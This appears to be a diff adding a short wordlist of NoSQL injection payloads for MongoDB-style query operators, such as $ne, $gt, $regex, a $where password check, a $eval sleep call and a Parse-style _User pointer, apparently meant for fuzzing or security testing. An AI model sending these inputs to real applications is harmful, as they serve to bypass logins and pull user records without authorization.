@@ -1,0 +1,13 @@
+$ne: {}
+{"$ne":""}
+{"age":{"$gt":""}}
+{"$where":"this.password.length < 1"}
+{"username":{"$regex":".*"}}
+{"__type":"Pointer","className":"_User","objectId":"xyz"}
+{"$eval":"sleep(1000)"}
+{"$in":["admin",""]}
+{"password":{"$ne":null}}
+{"$or":[{},{}]}
+{"$gt":""}
+{"username":{"$regex":"^[a-zA-Z0-9]{0}$"}}
+{"email":{"$exists":true}}
